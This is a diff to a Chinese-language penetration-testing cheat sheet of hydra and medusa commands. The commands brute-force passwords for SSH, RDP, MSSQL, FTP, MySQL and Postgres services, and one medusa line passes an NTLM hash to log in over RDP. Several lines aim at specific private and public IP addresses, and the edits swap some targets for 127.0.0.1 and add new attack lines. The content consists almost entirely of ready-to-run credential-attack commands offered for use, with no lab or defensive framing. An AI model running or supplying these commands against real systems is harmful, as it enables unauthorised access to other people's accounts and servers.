@@ -21,7 +21,7 @@ hydra -l sa -P password.txt -f mssql://39.99.149.148:1433/
 hydra -L usernames.txt –P ./password.txt <target-ip> mssql
 
 # 爆破ssh
-hydra -l serlon -P pass.txt 192.168.0.227 ssh     # 知道用户名不知道密码
+hydra -l serlon -P password.txt 127.0.0.1 ssh     # 知道用户名不知道密码
 hydra -l jan -P /opt/rockyou.txt ssh://10.10.100.180 # 知道用户名不知道密码
 hydra -L userlist.txt -p 123456 192.168.0.227 ssh # 知道密码不知道用户名
 hydra -l admin -p password 192.168.0.0/24 ssh     # 知道用户名和密码但不知道ip
@@ -76,6 +76,7 @@ hydra -t 1 -V -f -l administrator -P rockyou.txt rdp://192.168.1.1
 hydra -L user.txt -P pwd.txt 172.22.9.26 rdp -F -vV -e ns
 hydra 192.168.50.210 rdp -l admin -p 123456 -V -F
 hydra 192.168.31.22 rdp -L /usr/share/wordlists/dirbuster/password2.txt -P /usr/share/wordlists/dirbuster/password1.txt -V -F
+hydra -vV -l test -P password.txt -S rdp://192.168.127.130 -t 1
 ```
 
 ## rdp/御剑 RDP 爆破工具/超级弱口令检查工具/fscan/
@@ -99,11 +100,12 @@ medusa 比 hydra快一些
 medusa -h 192.168.1.1 -u admin -P /top1000_password.txt -M ftp -e ns -t 10 -f -r 0 -O ./result_ftp.txt
 medusa -M ftp -h 192.168.135.121 -u zc -p top1000.txt
 # ssh
-medusa -M ssh -h 192.168.75.141 -u flag4 -P top1000.txt -V
+medusa -M ssh -h 127.0.0.1 -u kali -P password.txt -n 22 -t 10 -O result.txt
+medusa -M ssh -h 127.0.0.1 -u kali -P password.txt
 # mysql
 medusa -h 192.168.137.133 -u root -P /wordlist.txt -M mysql
 # postgres
-medusa -H /ip.txt -u postgres -n 5432 -P /tmp/pass.txt -e ns -M postgres -T 255 -f -O /tmp/good.txt -r 0
+medusa -M postgres -H ./ip.txt -u postgres -n 5432 -P /tmp/pass.txt -e ns -T 255 -f -O /tmp/good.txt -r 0
 # rdp
 medusa -M rdp -m PASS:HASH -u Administrator -p 31D78236327B9619B14ED8EC9AB454C1
 ```
